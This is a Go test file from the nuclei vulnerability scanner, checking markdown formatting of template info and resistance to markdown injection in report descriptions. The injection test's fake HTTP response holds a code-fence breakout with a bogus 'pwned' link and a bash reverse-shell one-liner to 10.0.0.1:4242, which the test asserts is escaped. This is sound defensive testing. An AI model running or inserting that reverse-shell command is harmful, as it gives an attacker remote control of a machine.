package format

import (
	"fmt"
	"strings"
	"testing"

	"github.com/projectdiscovery/nuclei/v3/pkg/model"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/severity"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/stringslice"
	"github.com/projectdiscovery/nuclei/v3/pkg/output"
	"github.com/projectdiscovery/nuclei/v3/pkg/reporting/exporters/markdown/util"
	"github.com/stretchr/testify/require"
)

func TestToMarkdownTableString(t *testing.T) {
	info := model.Info{
		Name:           "Test Template Name",
		Authors:        stringslice.StringSlice{Value: []string{"forgedhallpass", "ice3man"}},
		Description:    "Test description",
		SeverityHolder: severity.Holder{Severity: severity.High},
		Tags:           stringslice.StringSlice{Value: []string{"cve", "misc"}},
		Reference:      stringslice.NewRawStringSlice("reference1"),
		Metadata: map[string]interface{}{
			"customDynamicKey1": "customDynamicValue1",
			"customDynamicKey2": "customDynamicValue2",
		},
	}

	result := CreateTemplateInfoTable(&info, &util.MarkdownFormatter{})

	expectedOrderedAttributes := `| Key | Value |
| --- | --- |
| Name | Test Template Name |
| Authors | forgedhallpass, ice3man |
| Tags | cve, misc |
| Severity | high |
| Description | Test description |`

	expectedDynamicAttributes := []string{
		"| customDynamicKey1 | customDynamicValue1 |",
		"| customDynamicKey2 | customDynamicValue2 |",
		"", // the expected result ends in a new line (\n)
	}

	actualAttributeSlice := strings.Split(result, "\n")
	dynamicAttributeIndex := len(actualAttributeSlice) - len(expectedDynamicAttributes)
	require.Equal(t, strings.Split(expectedOrderedAttributes, "\n"), actualAttributeSlice[:dynamicAttributeIndex]) // the first part of the result is ordered
	require.ElementsMatch(t, expectedDynamicAttributes, actualAttributeSlice[dynamicAttributeIndex:])              // dynamic parameters are not ordered
}

func TestCreateReportDescription_MarkdownInjection(t *testing.T) {
	// Setup a mock result event with malicious payload in various fields
	event := &output.ResultEvent{
		TemplateID: "test-template",
		Host:       "example.com",
		Matched:    "https://example.com/vulnerable",
		Type:       "http",
		Info: model.Info{
			Name:           "Test Template",
			Authors:        stringslice.StringSlice{Value: []string{"researcher"}},
			SeverityHolder: severity.Holder{Severity: severity.High},
			Tags:           stringslice.StringSlice{Value: []string{"test"}},
		},
		Request:     "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
		Response:    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>Hello, world\r\n\r\n```\r\n\r\nReferences:\r\n- https://rce.ee/pwned\r\n\r\n**CURL command**\r\n```sh\r\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\r\n```\r\n</body></html>",
		CURLCommand: "curl -X GET https://example.com",
	}

	result := CreateReportDescription(event, &util.MarkdownFormatter{}, false)
	fmt.Println(result)

	require.NotContains(t, result, "```\r\n\r\nReferences:\r\n- https://rce.ee/pwned")
	require.NotContains(t, result, "```sh\r\nbash -i >& /dev/tcp")
}
